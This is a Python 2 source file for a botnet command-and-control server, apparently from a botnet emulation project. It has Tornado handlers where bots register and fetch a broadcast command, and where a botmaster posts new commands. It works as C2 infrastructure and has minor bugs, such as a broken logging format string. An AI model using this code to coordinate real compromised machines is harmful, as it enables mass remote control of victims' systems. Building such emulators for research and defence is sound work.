#!/usr/bin/env python2
# coding=UTF-8
"""This file implements a CnC-Server that presents a web interface over which it can issue commands to clients
and keep track of clients that register themselves regularly with the server. A command may be any method that
is defined in BotCommands.py. This method will be executed by all clients that fetch it.
All handler support plain text and json output."""

import json, logging, string, sys, time, socket, os
from datetime import datetime
sys.path.append(os.path.join(os.path.dirname(__file__), os.pardir))
import tornado.web
from threading import Thread
from tornado.ioloop import IOLoop

from AbstractBot import Runnable
from resources import emu_config
from utils.MiscUtils import NetworkAddressSchema
from utils.LogfileParser import writeLogentry

_registered_bots = dict()

def make_app():
    """Starts the web interface that is used to interact with this server."""
    handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
    return tornado.web.Application(handlers, autoreload=False)


class BotInformation(object):
    def __init__(self, botid):
        self.last_seen = time.time()
        self.botid = botid


class MainHandler(tornado.web.RequestHandler):
    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps(tornado.web.Application.handlers))
        else:
            self.write("This server offers the following functions:\n"
                       "/register where clients can register themselves so we can keep track of them."
                       "/current_command where clients can retrieve commands that they should execute")

class CurrentCommandHandler(tornado.web.RequestHandler):
    """A handler that lets clients fetch the current command via HTTP GET and lets the botmaster issue a new command via
    HTTP POST."""

    current_command = {"command": "default_command", "kwargs": {}}

    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps(self.current_command))
        else:
            self.set_header("Content-Type", "text/plain")
            if not self.current_command == {}:
                self.write(
                    "%s: %s" % (self.current_command["command"], " ".join(self.current_command["kwargs"].values())))

    def post(self):
        logging.debug('%s != %s == %s' % (self.get_body_argument("command"), self.current_command["command"],
                                          self.get_body_argument("command") != self.current_command["command"]))
        if self.get_body_argument("command") != self.current_command["command"]:
            # noinspection PyBroadException
            old_command = self.current_command
            try:
                self.current_command["command"] = self.get_body_argument("command")
                self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
                logging.debug("The CnC-Server has received a new command: " % self.current_command)
            except:
                # rolls the change back
                logging.warning("Command could not be applied: body_arguments = %s" % self.get_body_arguments())
                self.current_command = old_command

        self.set_header("Content-Type", "text/plain")
        self.write("OK")


class RegisterHandler(tornado.web.RequestHandler):
    """Bots can register via HTTP POST, the number of currently known clients can be retrieved via HTTP GET"""

    def get(self):
        if "json" in string.lower(self.request.headers.get("Accept")):
            self.set_header("Content-Type", "application/json")
            self.write(json.dumps({"num_clients": len(self.registered_bots)}))
        else:
            self.set_header("Content-Type", "text/plain")
            self.write("Total number of known clients: %d" % len(self.registered_bots))

    def post(self):
        self.set_header("Content-Type", "text/plain")
        botid = self.get_body_argument("id")
        if self.registered_bots.has_key(botid):
            self.registered_bots[botid].last_seen = time.time()
        else:
            self.registered_bots[botid] = BotInformation(botid)
        self.write("OK")
        logging.debug("Bot %s has registered itself with the server" % botid)

    @property
    def registered_bots(self):
        global _registered_bots
        return _registered_bots

    @registered_bots.setter
    def registered_bots(self, value):
        global _registered_bots
        _registered_bots = value

class CnCServer(Runnable):
    """Allows the CnCServer to be run in its own thread."""

    # TODO: Implementiere das zählen der Bots mittels Twisted

    def __init__(self, host="0.0.0.0", port=emu_config.PORT, botsExpireAfterSeconds=3, **kwargs):
        Runnable.__init__(self, **kwargs)
        self.host = host
        self.port = port
        self.botsExpireAfterSeconds = botsExpireAfterSeconds

    def writeNumBots(self):
        global _registered_bots
        writeLogentry(runnable=type(self).__name__, message="Number of bots: %d"%len(_registered_bots))
        IOLoop.current().call_later(1, self.writeNumBots)

    def removeExpiredBots(self):
        global _registered_bots
        expired = [botid for botid in _registered_bots.keys() if _registered_bots[botid].last_seen < (time.time() - 3)]
        for botid in expired:
            del _registered_bots[botid]
        logging.debug("Removed expired bots: %s"%expired)

        IOLoop.current().call_later(1, self.removeExpiredBots)

    def start(self):
        """Implements start() from the superclass."""
        app = make_app()
        logging.debug("Start the CnCServer %s on %s:%d" % (self.name, self.host, self.port))
        try:
            self.removeExpiredBots()
            self.writeNumBots()
            app.listen(self.port)
            IOLoop.current().start()
        except socket.error as ex:
            logging.warning("Could not start the CnC-Server: %s" % ex)

    def stop(self):
        """Implements stop() from the superclass."""
        IOLoop.current().stop()
        logging.debug("Stopping CnCServer %s on %s:%d" % (self.name, self.host, self.port))


if __name__ == "__main__":

    schema = NetworkAddressSchema()
    if len(sys.argv) >= 2:
        cncaddress = schema.loads(sys.argv[1]).data
        cncserver = CnCServer(port=cncaddress.port)
    else:
        cncserver = CnCServer()

    thread = Thread(name="Runnable %s" % cncserver.name, target=cncserver.start)
    thread.start()
    # cncserver.start()
